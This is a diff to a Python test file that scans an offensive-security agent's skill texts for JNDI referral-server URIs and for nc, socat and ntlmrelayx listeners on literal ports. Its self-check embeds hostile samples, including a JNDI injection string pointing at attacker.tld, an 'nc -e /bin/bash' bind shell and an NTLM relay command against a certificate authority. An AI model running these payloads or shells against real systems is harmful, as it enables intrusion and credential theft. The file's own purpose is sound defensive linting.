@@ -14,10 +14,15 @@ Prompt, skill and community-skill text must therefore NOT:
   - offer a module that needs a SECOND inbound port (web_delivery, hta_server,
     office_word_hta) without the one-port caveat RIGHT THERE,
   - teach the ngrok handler bind as "your LPORT" (it is 127.0.0.1:4444),
-  - advertise exposing the sandbox with `ngrok tcp` / a `chisel server`.
+  - advertise exposing the sandbox with `ngrok tcp` / a `chisel server`,
+  - point a JNDI lookup at a referral server on a second port (marshalsec's 1389/1099, or
+    any `ldap://` / `rmi://` URI with a port in a JNDI context): no such server can run here,
+  - start a listener (ntlmrelayx, nc/ncat, socat) on anything but the one reachable port:
+    a literal port, or ntlmrelayx without `--no-smb-server` and a placeholder `--http-port`.
 
 These scan the files on disk, so they run hermetically in the agent image and need no
-imports beyond the stdlib. They fail on 40c11197 and pass after the FU-20..23 edits.
+imports beyond the stdlib. They fail on 40c11197 and pass after the FU-20..23 edits; the
+JNDI and listener checks fail on 6a1769ae and pass after G-28.
 """
 
 from __future__ import annotations
@@ -102,6 +107,55 @@ def _http_server_violation(text: str):
         elif _PLACEHOLDER.match(port_tok):
             continue  # e.g. <listen_port> -- an explicit, settings-derived port
         # anything else (a non-sandbox literal, a shell var) is left alone
+
+
+# A JNDI lookup pointed at a referral server: marshalsec's default LDAP and RMI ports
+# anywhere, or an ldap:// / rmi:// URI that names a port on a line about JNDI. A
+# target-side LDAP URI (an LDAP-injection skill's `ldaps://target.tld:636`) is left alone.
+_MARSHALSEC_PORT = re.compile(r":(?:1389|1099)\b")
+_PORTED_JNDI_URI = re.compile(r"(?<![A-Za-z])(?:ldap|rmi)://[^\s/'\"`<>]+:\d+")
+_JNDI_CONTEXT = re.compile(r"jndi|dataSourceName|JdbcRowSetImpl|InitialContext", re.IGNORECASE)
+
+# Listener commands. A port is fine only as a placeholder or a variable (`<LISTEN_PORT>`,
+# `$LISTEN_PORT`): the block names the one reachable port, never the text.
+_NC_LISTEN = re.compile(r"(?<![\w-])(?:nc|ncat|netcat)((?:\s+-[A-Za-z]+)+)\s+(\d{2,5})\b")
+_SOCAT_LISTEN = re.compile(r"TCP[46]?-LISTEN:(\d+)", re.IGNORECASE)
+_NTLMRELAYX = re.compile(r"(?:impacket-ntlmrelayx|ntlmrelayx(?:\.py)?)(?=\s+-)")
+_PORT_PLACEHOLDER = re.compile(r"^(?:<[^>]+>|\$\{?[A-Za-z_][A-Za-z0-9_]*\}?)$")
+
+
+def _command_run(text: str, start: int) -> str:
+    """The rest of a command from `start`: backslash-newline continuations joined, ended
+    at a newline, a backtick or a table cell."""
+    out = []
+    i = start
+    while i < len(text):
+        ch = text[i]
+        if ch == "\\" and text[i + 1: i + 2] == "\n":
+            i += 2
+            continue
+        if ch in "\n`|":
+            break
+        out.append(ch)
+        i += 1
+    return "".join(out)
+
+
+def _listener_violations(text: str):
+    """Yield (lineno, reason) for a listener started on a port the target cannot reach."""
+    for m in _NC_LISTEN.finditer(text):
+        if "l" in m.group(1).replace("-", ""):
+            yield _lineno(text, m.start()), f"nc/ncat listener on literal port {m.group(2)}"
+    for m in _SOCAT_LISTEN.finditer(text):
+        yield _lineno(text, m.start()), f"socat listener on literal port {m.group(1)}"
+    for m in _NTLMRELAYX.finditer(text):
+        args = _command_run(text, m.end()).split()
+        if not any(a in ("-t", "--target", "-tf") for a in args):
+            continue  # a mention of the tool, not a command
+        port = args[args.index("--http-port") + 1] if "--http-port" in args[:-1] else None
+        if "--no-smb-server" not in args or port is None or not _PORT_PLACEHOLDER.match(port):
+            yield _lineno(text, m.start()), ("ntlmrelayx without --no-smb-server and a "
+                                             "placeholder --http-port")
 
 
 _TAIL_END = re.compile(r"[\n`\"]")
@@ -199,6 +253,45 @@ class ReversePortHygieneTest(unittest.TestCase):
             '("needs a second inbound port; the sandbox exposes only one"): '
             f"{offenders}",
         )
+
+    def test_no_jndi_referral_server_on_a_second_port(self):
+        """G-28: JNDI is confirmed over OAST; no text points it at a referral server."""
+        offenders = []
+        for path, text in _text_files():
+            for ln, line in enumerate(text.splitlines(), start=1):
+                if _MARSHALSEC_PORT.search(line) or (
+                        _PORTED_JNDI_URI.search(line) and _JNDI_CONTEXT.search(line)):
+                    offenders.append(f"{_rel(path)}:{ln} -> {line.strip()[:80]!r}")
+        self.assertEqual(
+            offenders, [],
+            "A JNDI lookup points at a referral server on a second port; the sandbox can run "
+            "no such server and a target reaches only the one reverse port. Point the URI at "
+            f"the OAST domain (no port) and stop at the confirmed lookup: {offenders}",
+        )
+
+    def test_listeners_bind_only_the_one_reachable_port(self):
+        """G-28: a relay or listener the target calls back to uses the one port, by its
+        placeholder, and ntlmrelayx starts no SMB server the callback could never reach."""
+        offenders = []
+        for path, text in _text_files():
+            for ln, reason in _listener_violations(text):
+                offenders.append(f"{_rel(path)}:{ln} ({reason})")
+        self.assertEqual(offenders, [], f"listener on an unreachable port: {offenders}")
+
+    def test_the_listener_check_catches_what_it_is_for(self):
+        """The two scans above would pass vacuously if their patterns never matched."""
+        bad = ("impacket-ntlmrelayx -t rpc://CA -rpc-mode ICPR --adcs -smb2support\n"
+               "nc -lvnp 9001\n"
+               "socat TCP-LISTEN:8443,fork -\n")
+        self.assertEqual(len(list(_listener_violations(bad))), 3)
+        good = ("impacket-ntlmrelayx -t http://CA/x --http-port $LISTEN_PORT --no-smb-server\n"
+                "nc -lvp <BIND_PORT> -e /bin/bash\n"
+                "`impacket-ntlmrelayx` [relay]\n")
+        self.assertEqual(list(_listener_violations(good)), [])
+        self.assertTrue(_MARSHALSEC_PORT.search("${jndi:ldap://attacker.tld:1389/Exploit}"))
+        line = '"dataSourceName":"ldap://attacker.tld:389/x"'
+        self.assertTrue(_PORTED_JNDI_URI.search(line) and _JNDI_CONTEXT.search(line))
+        self.assertIsNone(_PORTED_JNDI_URI.search("ldaps://target.tld:636"))
 
     def test_ngrok_troubleshooting_binds_4444(self):
         """FU-20: the ngrok/chisel handler binds 127.0.0.1:4444, not 'your LPORT'."""
